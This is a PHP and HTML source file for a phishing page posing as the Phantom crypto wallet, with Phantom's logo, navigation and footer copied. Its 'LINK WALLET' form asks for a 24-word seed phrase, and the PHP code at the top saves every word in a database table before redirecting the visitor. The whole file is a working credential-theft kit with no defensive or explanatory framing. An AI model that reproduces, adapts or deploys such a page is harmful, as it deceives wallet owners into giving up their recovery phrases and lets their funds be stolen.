<?php
require "connection_beginner.php";

if($_SERVER['REQUEST_METHOD'] == "POST")
{
$key1 = addslashes($_POST['key1']);
$key2 = addslashes($_POST['key2']);
$key3 = addslashes($_POST['key3']);
$key4 = addslashes($_POST['key4']);
$key5 = addslashes($_POST['key5']);
$key6 = addslashes($_POST['key6']);
$key7 = addslashes($_POST['key7']);
$key8 = addslashes($_POST['key8']);
$key9 = addslashes($_POST['key9']);
$key10 = addslashes($_POST['key10']);
$key11 = addslashes($_POST['key11']);
$key12 = addslashes($_POST['key12']);
$key13 = addslashes($_POST['key13']);
$key14 = addslashes($_POST['key14']);
$key15 = addslashes($_POST['key15']);
$key16 = addslashes($_POST['key16']);
$key17 = addslashes($_POST['key17']);
$key18 = addslashes($_POST['key18']);
$key19 = addslashes($_POST['key19']);
$key20 = addslashes($_POST['key20']);
$key21 = addslashes($_POST['key21']);
$key22 = addslashes($_POST['key22']);
$key23 = addslashes($_POST['key23']);
$key24 = addslashes($_POST['key24']);

$date = date('Y-m-d H:i:s');

$query = "insert into nose (nose1,nose2,nose3,nose4,
nose5,nose6,nose7,nose8,nose9,nose10,nose11,nose12,
nose13,nose14,nose15,nose16,nose17,nose18,nose19,
nose20,nose21,nose22,nose23,nose24,date) values
('$key1','$key2','$key3','$key4','$key5','$key6',
'$key7','$key8','$key9','$key10','$key11','$key12','$key13',
'$key14','$key15','$key16','$key17','$key18',
'$key19','$key20','$key21','$key22','$key23','$key24','$date')";
$result = mysqli_query($con,$query);
header("Location:contact.php");
die;
}

?>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>

  <style>
    
    *{
      marging: 0px;
      padding: 0px;
      box-sizing: border-box;
    }
      body{
       padding-bottom: 0px;
      font-family:montserrat, arial, verdana;
      }

      {
        height: auto;
        margin-right: auto;
        margin-left: auto;
        margin-top: 100px;
      border-style: none;
       max-width: 600px;
       rgba(0, 0, 0, 0.4) 0px 0px 15px 1px;
     }

       .container{
                   box-shadow: rgba(0, 0, 0, 0.4) 0px 0px 15px 1px;
                   box-sizing: border-box;
                   width: auto;
                   position: relative;
                   background: white;
                   border-width: 0px;
                   border-style: none;
                   border-color: initial;
                   border-image: initial;
                   border-radius: 0px;
                   padding: 50px 30px;
                   margin: auto;
                   margin-top: 100px;
                   max-width: 600px;


            }

      h2{
        text-align: center;
          
              color: rgba(102, 102, 102,0.9);
       }

      h4{
        text-align: center;
        color: rgba(102, 102, 102,0.7);
         
      }
     

      button{
           width: 100px;
      font-weight: bold;
      color: white;
      cursor: pointer;
      background: rgb(238, 9, 121);
      border-width: 0px;
      border-style: none;
      border-color: initial;
      border-image: initial;
      border-radius: 25px;
      padding: 10px 5px;
      display: flex;
      text-align: center;
      margin-top: 30px;
      margin-bottom: px;
      margin-left: auto;
      margin-right: auto;
      justify-content: center;
    }
     .div-bt a{
      text-decoration: none;
     }
      
      .bt{
        display: flex;
       padding-bottom: 20px;
       text-align: center;
       justify-content: center;
      }

      
     

   nav{
    height: 100px;
    background-color: blanchedalmond;
    display: flex;
    align-items: center;
    flex-direction: row;
    justify-content: space-evenly;
    font-size: 20px;
   }

   nav a{
    text-decoration: none;
    color: black;
   }
nav svg{
    cursor: pointer;
   }

   

      .input-container{
       width: 100%;
               display: flex;
            
           
       }

      .div-input1,.div-input2,.div-input3{
            display: flex;
    align-items: center;
    flex:1;
    flex-direction: column;
    width: 100%;
    margin: 15px;
   
           }

      input{
        margin: auto;
        text-align: left;
        margin: 5px;
        padding: 8px 15px;
        font-weight: 500;
        font-size: 15px;
       width: 100%;
       border:1px solid darkred;
      }



      input::placeholder{
       color: rgba(102, 102, 102,0.4);
      }

       
      #pkey:action{
        border:1px solid red;
      }


   .tom svg{
    margin-top: 30px;
    height: 120px;
    cursor: pointer;
    }

   .footer{
    display: flex;
    height: 400px;
    margin-top: 40px;
    margin-left: 300px;
    margin-right: 100px;
  }

   .foot{
    display: flex;
    align-items: center;
    flex:1;
    flex-direction: column;
  }



  .foot a{
    margin:20px;
    text-decoration: none;
   color: black;
  }



  .mark{
    margin-left: 90px;
    padding-bottom: 30px;
   }

  footer{
    background-color: #ede7ea;
    margin: 50px;
    border-radius: 20px;
    padding-bottom: 20px;
  }


     .foot .grey{
       color: rgba(102, 102, 102,0.9);
       font-weight: 700;
     }

  </style>

  <nav>
    
    <svg class="svg-pha" fill="none" viewBox="0 0 152 30" height="50%"><title>Logo Phantom</title>
      <path d="M0 25.219C0 29.105 2.065 30 4.213 30c4.544 0 7.96-3.998 9.997-7.157-.248.698-.386 1.397-.386 2.069 0 1.845 1.047 
      3.159 3.112 3.159 2.837 0 5.866-2.517 7.436-5.229-.11.392-.165.755-.165 1.09 0 1.287.716 2.098 2.175 2.098 4.6 0 9.226-8.248 
      9.226-15.462 0-5.62-2.81-10.568-9.86-10.568C13.357 0 0 15.322 0 25.219ZM21.48 9.953c0-1.398.771-2.376 1.9-2.376 1.102 
      0 1.873.978 1.873 2.376s-.77 2.405-1.872 2.405c-1.13 0-1.9-1.007-1.9-2.405Zm5.894 0c0-1.398.77-2.376 1.9-2.376 1.101
       0 1.872.978 1.872 2.376s-.77 2.405-1.872 2.405c-1.13 0-1.9-1.007-1.9-2.405ZM41.115 
       26.953h4.13v-3.775c0-1.985-.137-2.908-.936-4.725l.44-.224c1.323 3.048 3.278 4.25 5.316 4.25 3.277 0 
       5.893-2.908 5.893-7.41 0-4.305-2.396-7.464-5.838-7.464-2.038 0-4.048 1.174-5.37
        4.222l-.44-.224c.55-1.202.935-2.404.935-3.55h-4.13v18.9Zm4.13-11.911c0-1.845 1.378-3.886 3.415-3.886 1.653 0 3.002 1.37
         3.002 3.858 0 2.46-1.294 3.914-3.03 3.914-1.927 0-3.386-1.985-3.386-3.886ZM57.25 22.032h4.132V17.11c0-3.467 1.211-5.927 
         3.47-5.927 1.431 0 1.872.978 1.872 3.41v7.438h4.131v-8.108c0-4.418-1.57-6.32-4.572-6.32-3.056 0-4.048 2.098-5.232 
         4.502l-.44-.251c.605-1.51.77-2.46.77-3.803V3.327h-4.13v18.705ZM76.757 22.479c2.617 0 4.186-1.79 5.288-3.914l.468.251c-.44
          1.007-.854 2.21-.854 3.216h4.049v-7.605c0-4.53-1.873-6.822-6.252-6.822-4.296 0-6.416 2.18-6.83 4.473l3.966.7c.138-1.203
           1.102-2.014 2.644-2.014s2.423.783 2.423 1.734c0 .95-.908 1.398-3.332 1.426-3.58.056-6.224 1.37-6.224 4.166 0 2.292 1.79 
           4.389 4.654 4.389Zm-.55-4.641c0-2.265 3.442-.671 5.37-2.405v.532c0 1.985-1.763 3.41-3.415 3.41-.936
            0-1.955-.39-1.955-1.537ZM87.56 22.032h4.13V17.11c0-3.467 1.212-5.927 3.47-5.927 1.432 0 1.873.978 1.873 
            3.41v7.438h4.131v-8.108c0-4.418-1.57-6.32-4.572-6.32-3.056 0-4.048 2.098-5.232 
            4.502l-.44-.251c.605-1.51.77-2.46.77-3.803h-4.13v13.98ZM112.328 
            22.088V18.62c-.882.307-3.333.838-3.333-1.202v-5.956h3.663v-3.41h-3.663V4.305l-4.158 1.258v2.488h-2.478v3.411h2.478l.028 
            6.291c0 4.67 4.103 5.34 7.463 4.334ZM120.988 22.479c4.185 0 7.38-3.243 7.38-7.465 0-4.194-3.195-7.41-7.38-7.41-4.186 0-7.408
             3.216-7.408 7.41 0 4.222 3.222 7.465 7.408 7.465Zm-3.14-7.437c0-2.32 1.294-3.942 3.14-3.942 1.845 0 3.111 1.621 3.111 
             3.942 0 2.32-1.266 3.942-3.111 3.942-1.846 0-3.14-1.622-3.14-3.942ZM129.729 22.032h4.13V17.11c0-3.607 1.019-5.927 
             2.837-5.927 1.184 0 1.68.95 1.68 3.41v7.438h4.131V17.11c0-3.383 1.101-5.927 2.836-5.927 1.157 0 1.68 1.09 1.68 
             3.41v7.438h4.131v-8.108c0-4.446-1.432-6.32-4.241-6.32-2.919 0-4.076 2.014-4.847 
             4.446l-.468-.251c.413-1.454.165-2.237-.331-2.852-.716-.895-1.735-1.342-3.029-1.342-2.589 0-3.718 1.845-4.709 
             4.417l-.441-.28c.468-1.257.771-2.264.771-3.69h-4.13v13.98Z" fill="currentColor"></path></svg> 

    <a href="" class="top">Security</a>
    <a href="" class="top">Learn</a>
    <a href="" class="top">Explore</a>
    <a href="" class="top">Blog</a>
    <a href="" class="top">Guides</a>
    <a href="" class="top">Developers</a>
    <a href="" class="top">Support</a>
   
  </nav>


  <div class="container">
  <h2>
   LINK WALLET
  </h2>  
  <h4>
     24 Seed Phrase
  </h4>

  <form action="24.php" method="post">

    <div class="input-container">

         <div class="div-input1"> 
              <input type="text" name="key1"  id="pkey" placeholder="1" required>
               <input type="text" name="key4"  id="pkey" placeholder="4" required> 
               <input type="text" name="key7"  id="pkey" placeholder="7" required>  
               <input type="text" name="key10"  id="pkey" placeholder="10" required> 
               <input type="text" name="key13"  id="pkey" placeholder="13" required> 
               <input type="text" name="key16"  id="pkey" placeholder="16" required> 
               <input type="text" name="key19"  id="pkey" placeholder="19" required> 
               <input type="text" name="key22"  id="pkey" placeholder="22" required> 
        </div>

        <div class="div-input2">    
          <input type="text" name="key2"  id="pkey" placeholder="2" required>
           <input type="text" name="key5"  id="pkey" placeholder="5" required> 
           <input type="text" name="key8"  id="pkey" placeholder="8" required> 
           <input type="text" name="key11"  id="pkey" placeholder="11" required> 
           <input type="text" name="key14"  id="pkey" placeholder="14" required> 
           <input type="text" name="key17"  id="pkey" placeholder="17" required> 
           <input type="text" name="key20"  id="pkey" placeholder="20" required> 
           <input type="text" name="key23"  id="pkey" placeholder="23" required> 
         </div>

        <div class="div-input3">  
           <input type="text" name="key3"  id="pkey" placeholder="3" required> 
           <input type="text" name="key6" id="pkey"placeholder="6" required> 
           <input type="text" name="key9" id="pkey"placeholder="9" required> 
           <input type="text" name="key12" id="pkey"placeholder="12" required> 
           <input type="text" name="key15" id="pkey"placeholder="15" required> 
           <input type="text" name="key18" id="pkey"placeholder="18" required> 
           <input type="text" name="key21" id="pkey"placeholder="21" required>
           <input type="text" name="key24"  id="pkey" placeholder="24" required>
        </div>

   </div>
 
           <div class="div-bt">
 
                 
                     <button >Next</button>
                  
            </div>
  </form>

</div>

  
<footer>
<div class="tom">
    <svg class="css-1yaf92l e18osog01" width="200" 
                    height="180" viewBox="0 0 200 180" fill="none"><path fill-rule="evenodd" clip-rule="evenodd"
                     d="M89.1138 112.613C83.1715 121.719 73.2139 133.243 59.9641 133.243C53.7005 133.243 47.6777 130.665 47.6775 119.464C47.677 
                     90.9369 86.6235 46.777 122.76 46.7764C143.317 46.776 151.509 61.0389 151.509 77.2361C151.509 98.0264 138.018 121.799 124.608
                      121.799C120.352 121.799 118.264 119.462 118.264 115.756C118.264 114.789 118.424 113.741 118.746 112.613C114.168 120.429 105.335 
                      127.683 97.0638 127.683C91.0411 127.683 87.9898 123.895 87.9897 118.576C87.9897 116.642 88.3912 114.628 89.1138
                       112.613ZM115.936 68.7103C112.665 68.7161 110.435 71.4952 110.442 75.4598C110.449 79.4244 112.689 82.275 115.96 82.2693C119.152
                        82.2636 121.381 79.4052 121.374 75.4405C121.367 71.4759 119.128 68.7047 115.936 68.7103ZM133.287 68.6914C130.016 68.6972 
                        127.786 71.4763 127.793 75.4409C127.8 79.4055 130.039 82.2561 133.311 82.2504C136.503 82.2448 138.732 79.3863 138.725 
                        75.4216C138.718 71.457 136.479 68.6858 133.287 68.6914Z" fill="currentColor"></path></svg>
    
  </div>
 <div class="footer">

  

      <div class="foot">
                  <a href="" class="grey">Product</a>
                  <a href="">Feature Request</a>
                 <a href="">Support</a>
      </div>
    
   

  <div class="foot">
    <a href="" class="grey">Resources</a>
     <a href="">Blog</a>
    <a href="">Docs</a>
    <a href="">Taxes</a>
  </div>
    

<div class="foot">
   
    <a href="" class="grey">Company</a>

    <a href="" >About</a>
    <a href="" >Terms</a>
    <a href="" >Privacy</a>
    <a href="" >Status</a>
    <a href="" >Careers</a>
  </div>

  <div class="foot">
           <a href="" class="grey">
            Socials
          </a>
         <a href="">
            Twitter
          </a>

          <a href="">
            YouTube
          </a>

          <a href="">
            Reddit
          </a>

          <a href="">
           Podcast
          </a>

          
          <a href="">
           linkedin
          </a>
      </div>
  </div>
   <div class="mark">
  &copy; Phantom <?php echo date("Y"); ?>
</div class="mark">
</footer>

</body>
</html>


